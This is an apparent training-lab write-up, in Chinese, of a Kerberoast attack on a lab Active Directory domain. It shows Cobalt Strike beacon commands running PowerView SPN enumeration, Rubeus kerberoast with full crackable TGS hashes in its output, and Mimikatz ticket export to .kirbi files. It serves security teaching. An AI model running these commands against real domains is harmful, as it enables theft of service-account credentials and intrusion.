Hands-On 6:
Task
•  Using the Kerberoast attack, get the clear-text password for an account in us.techcorp.local domain.

pv枚举spn

```
beacon> powershell-import tools/PowerView.ps1
[*] Tasked beacon to import: /root/cs4.7/tools/PowerView.ps1
[+] host called home, sent: 145588 bytes
beacon> powershell Get-NetUser -spn |select userprincipalname,serviceprincipalname
[*] Tasked beacon to run: Get-NetUser -spn |select userprincipalname,serviceprincipalname
[+] host called home, sent: 453 bytes
[+] received output:
#< CLIXML



userprincipalname serviceprincipalname            

----------------- --------------------            

                  kadmin/changepw                 
serviceaccount    USSvc/serviceaccount            
appsvc            appsvc/us-jump.us.techcorp.local

```

## 请求spn

这里使用Rubeus.exe请求一个spn，注意，用原来tools里面的Rubeus.exe 请求会报错，我用tools里的master包重新生成了一个Rubeus.exe可以用
```
beacon> execute-assembly tools/Rubeus-master/Rubeus/bin/Debug/Rubeus.exe kerberoast /user:appsvc /simple /rc4opsec
[*] Tasked beacon to run .NET program: Rubeus.exe kerberoast /user:appsvc /simple /rc4opsec
[+] host called home, sent: 402057 bytes
[+] received output:


   ______        _                      

  (_____ \      | |                     

   _____) )_   _| |__  _____ _   _  ___ 

  |  __  /| | | |  _ \| ___ | | | |/___)

  | |  \ \| |_| | |_) ) ____| |_| |___ |

  |_|   |_|____/|____/|_____)____/(___/



  v1.6.1 





[*] Action: Kerberoasting

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User           : appsvc
[+] Ticket successfully imported!
[*] Searching path 'LDAP://US.TECHCORP.LOCAL/DC=US,DC=TECHCORP,DC=LOCAL' for Kerberoastable users
[*] Searching for accounts that only support RC4_HMAC, no AES



[*] Total kerberoastable users : 1



$krb5tgs$23$*appsvc$us.techcorp.local$appsvc/us-jump.us.techcorp.local*$CBE3A9A8B3E2839A6B4A5A9BA444E7AA$1FDB6AD1D70FB51677AE629A6FEDA97D338C60144BF284F2DA06751BB45E956C10613AD4449FDD08BC0CFFA2258E9E4DA121195CB652CC5DE9F7202A3039B3D94579D71A1346093F445E63306E19699DA93827C35A5FEB3E634E0F5B9AE55CFADA8B005A2D475B814EE61C5973CF0F4E4E7B288E2181922BEA951297C592AED3D703D9FF31B4C68C13AA3C0E634647DCF1F95906E3F54DF4CF84A1DBD97205103043DCCCC08C601ADC31672C8255653482FD09ED44373B34B355C8E318755D0AF638C16D02C3F52DC0F54CA064544DFC87AC713BDD67329EB2AE8C217759ECCB31996E5AF6201FE91986993082B8A9B414D31A42050BF337C1E42B2ABF282227047AE0E98727BF0F0B760DD922A7E37C7700288B08BFEE9CF334199AC1419E8FFF193BD1481E5EF5E79D9F7D9A714AB39BD36234B5ECC58300E97B44B8E2AB8C6346648DDD2BAF1514F3372BC77F0F382B84CC35521A05BDD944F54765FCE836336D72A77E2CFC67C7C9DA091DBF0A8594142138D135AEE11ED72FAD5B7B8F6B1C8F5521F32173080FFD009DBDF8C420FA5AD0F1C940D9D7615629FB308A20FB14907642F364B06E8464D5E8A98CCF43B4694B467D9F14C141E34F892C01A6D7EA17D75F825560F9AA3FCF8EE3710B08A8E000868967930A69ADFEDC008E994383A0F747C12D08096856F814E16CE8D4C3EA80ACBD75A1E451615157C6E0833FAF441086F25C323403610A02F99445EFB68E5DEB3B24700ED15850273562367D9B6580715587797073372099D78DC5D4863B382BBF70C37E12A89E16AB98AE505794F7F93CA3ABEEFF820F2DB431D666DB38CD5A39180890743EC28570BEEA46263F0FCD6414ABE324B816099C6F1191EE185AE34C8B1FE8C43AE946FE0A47C04BAA07487057892EF91EE8EE556A00BD888D9DC856B203FF88E360F267B7E73143152DEA771C70AD167B6ED9C21C8BFCF4A1BFA41CAB4A4ACF3CBA90205A3B3ADB89F08D961F575463DBC7AFBDB61B8CA64D51B480E25F718E05ECC40071BB75E07E019E29198C521195D466E9D111A2754CCA5DF22322E0549092D6954367BD2642447228E6792EB349C11EB057A8C6BCEF7DDE7737796A9AAA40FCFCFD5D5FB79E7771CCF8E408BC6E178DD6C55C097164C923E62D70A2FE4873BF6CC3BCDC08D1182B1846328CA9D78EB03C5E27509C52744DC8F2E72C87A24C90ED8BF23F884BF4E30C9E7C765E028F436F4F26730A797357081155D86FDD4B85833A8E27FA561400913FE0625215D863206E9E340288489B80B1692346BC7072F3D65D52ED9E5EA7A0394ED690602E880B58335407CF63A3462BFB6BBB9585108A78268779E8DE819939B11D51EF5313AFC6FC6A33C48C8BBD90C160E8B7E0263F810394E0F56835D1A018F29CF9DA6AD6899C917EEBCD971E212CF9332EF87A92369C3D4E512AD6BEA6EB188B61C279F83B3EF4A40A0B6CBADAFD402717EBE29E1ECDE16E7D9EA14451F3657B0437722B8592B9AF4D8DDCB7737F3C5AEEB090AF2263F748F98B24A8542226CA9778231F70C8EE0FBB1D485D756B21F7A26E84F6FC927CEA17FE6BCF880F5ED89BB5340C369501




```


这里的exe是[github](https://github.com/GhostPack/Rubeus)上的开发版
```
beacon> execute-assembly tools/Rubeus-master/Rubeus/bin2/Debug/Rubeus.exe kerberoast /user:appsvc /simple /rc4opsec
[*] Tasked beacon to run .NET program: Rubeus.exe kerberoast /user:appsvc /simple /rc4opsec
[+] host called home, sent: 591485 bytes
[+] received output:


   ______        _                      

  (_____ \      | |                     

   _____) )_   _| |__  _____ _   _  ___ 

  |  __  /| | | |  _ \| ___ | | | |/___)

  | |  \ \| |_| | |_) ) ____| |_| |___ |

  |_|   |_|____/|____/|_____)____/(___/



  v2.2.0 





[*] Action: Kerberoasting



[*] Using 'tgtdeleg' to request a TGT for the current user

[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else

[*] Target User            : appsvc

[*] Target Domain          : us.techcorp.local

[+] Ticket successfully imported!

[*] Searching for accounts that only support RC4_HMAC, no AES

[*] Searching path 'LDAP://US-DC.us.techcorp.local/DC=us,DC=techcorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=appsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'



[*] Total kerberoastable users : 1



$krb5tgs$23$*appsvc$US.TECHCORP.LOCAL$appsvc/us-jump.us.techcorp.local*$D5C5A2525F86B3A7DE31C06C45CA12D1$CBC15EA78D25C2B6BFFA92A204B85E7E2EFD848698390EF525C5CBBF2ACCF8F935F3145FBC39FD4244FEBFDDF80527F953930EEB416CB92C5D01719AFD78EAA45BD66CF1CE836FC054DD6315223D0C5296C78D99FFBA4FE12BE5A76A60F1E1C21EFE4DEA50B710DE722DD4549D6247E085BA262DB4A64B6A35DAD67D4C7E44388DD62D2DC1829FB042846EDF4F8CFBB66CE7A10AF621B1C03121B40847EA04B1B0AE68D7D9ED221E08989D59CA01689A8F9B79AC8DEE7361E603816BA2CF4068A175F80495808A05DD37436CC9E42CC7D17802C84875DF916649C826C44005AAC3AB2A6066197832BBB02B08690D61E607CFB3DC9E62BDBC07D315860825DB5A80FD2F9A493295AF6C22823C6AAB89E8CE7DD5939D5C336FEFF714D5A7F13050966910142703ED7FC655152B9DDA59904567C72AA82CF03725D0B70219C9EF8499E3A22CF5ADFD4FB07FCEEF134C81491B5C7AA92F7F27CBD9DC82907421CA82793EAA94529D71DA72591D8D822260627C4D442D4BBCC5513B6EB18D115976B09A353A39732A53F288E30BCEB4F2F1853635F7C56B113BFE4FB3E3F4D5730B5576B2EB3F352488F724523E4018CBEBAE15F7BF277FCCD2D31C4D04227B0B991F5791C43610D718FC905ECBD39FE997D06A2522142C6576658D02B3D3FDBF2A7FD8DB00B82165E7C607A71004DFA94AF65DA504F85854D61C1EFF5A699E140A65C2B0864F4102E09CBA47426E5D6883AA8D1B1713947F71A9B5F8D865218FC5ED0333D8F5D5E6A797865014162B2AB49D4187DDA382A7F169FD61BBCD0C7BC354DAEF668C9058B54CC8B51F04B6D04CCC078537D435E06F12C12B0BBAAA408F0EAB03599697E12722BC6500E123787A7E12AD1AF46E5C18D0323014AE4A173D680C80DE6C36D9CF7CD0D216D314D5F02E2C841CBD2A64B6BB83C9ECA1690377C6FC47E8715F308CF5D7C50409417EAABAEFF811BB295AA6D9A47C39FCE63F67E178F4433DC73C42DD31B9FEADF404A51826FA4E4A40D6AAB96546EE32A0716404F5735F28322878327EA1F09197DC0C9AE56F628F95A732A312266084F29CFB56D6CFC104D95EB05BC26ADFFFE0FDB4CF352492DEBB8F11ED182DDED6C2DA4983885696E2831321C6F76E48539D97C2AB095D54AD8F54B65FBEDA793A0E651A81CC9576AB8D43F51357E94E39CC2B15AB70065189FB8DA0702C0B32A172DAEE4059ACC1F15006547242935C0268C904237D957A808612E1A5876AC268FF5923C38D892B67B86160B8A875704FA67EC00F045E0BE274F79B8551F3E4EEA4DD3B44B7030983D27F881059491688E979D8EA55D8A7E40AEBA5527753CB68D4DAD2C111C1A5467AD69204C8F9448053C5B22E057CECF575A64DB530A054BDECBE0FC79B5DD33F236D82D60EF119E6792091602E2CDA93EAE4EF93990E82976B322BCA4230DF89DCCB99DD07DF052BDECC2040727FD58BB3E4D15392498E2E4701749639A8EDAEEB17FC06B35408C504E1E486DF2100190861EFF2A99E695BDC6EB0B1B0DA91FEA82DED96BF918C396A0D088EAB2DD054A1578D79D784D4A51429D86BD46D1A4584CB62CD1F3E98EF8F101065




```

这里的哈希不知道为啥破解不出来。。


## 请求一张ticket

这里还是要到学生机执行，CS执行会报错
```
PS C:\Windows\system32> Add-Type -AssemblyName System.IdentityModel
PS C:\Windows\system32> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "USSvc/serviceaccount"


Id                   : uuid-0ede882b-e9df-46b5-919c-99dbe006902a-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 11/12/2022 2:34:37 PM
ValidTo              : 11/13/2022 12:34:37 AM
ServicePrincipalName : USSvc/serviceaccount
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey



PS C:\Windows\system32> klist

Current LogonId is 0:0x242f4b

Cached Tickets: (2)

#0>     Client: studentuser138 @ US.TECHCORP.LOCAL
        Server: krbtgt/US.TECHCORP.LOCAL @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 11/12/2022 6:34:37 (local)
        End Time:   11/12/2022 16:34:37 (local)
        Renew Time: 11/19/2022 6:34:37 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: US-DC.us.techcorp.local

#1>     Client: studentuser138 @ US.TECHCORP.LOCAL
        Server: USSvc/serviceaccount @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 11/12/2022 6:34:37 (local)
        End Time:   11/12/2022 16:34:37 (local)
        Renew Time: 11/19/2022 6:34:37 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: US-DC.us.techcorp.local
```


这里如果用CS的mimikatz模块导出，命令生效但是找不到文件..
```
beacon> mimikatz kerberos::list /export
[*] Tasked beacon to run mimikatz's kerberos::list /export command
[+] host called home, sent: 788092 bytes
[+] received output:

[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 11/12/2022 6:34:37 AM ; 11/12/2022 4:34:37 PM ; 11/19/2022 6:34:37 AM
   Server Name       : krbtgt/US.TECHCORP.LOCAL @ US.TECHCORP.LOCAL
   Client Name       : studentuser138 @ US.TECHCORP.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
   * Saved to file     : 0-40e10000-studentuser138@krbtgt~US.TECHCORP.LOCAL-US.TECHCORP.LOCAL.kirbi

[00000001] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 11/12/2022 6:34:37 AM ; 11/12/2022 4:34:37 PM ; 11/19/2022 6:34:37 AM
   Server Name       : USSvc/serviceaccount @ US.TECHCORP.LOCAL
   Client Name       : studentuser138 @ US.TECHCORP.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
   * Saved to file     : 1-40a10000-studentuser138@USSvc~serviceaccount-US.TECHCORP.LOCAL.kirbi
```

还是要在学生机操作。。
```
PS C:\AD\Tools> . C:\AD\Tools\Invoke-Mimikatz.ps1
PS C:\AD\Tools> Invoke-Mimikatz -Command '"kerberos::list /export"'
```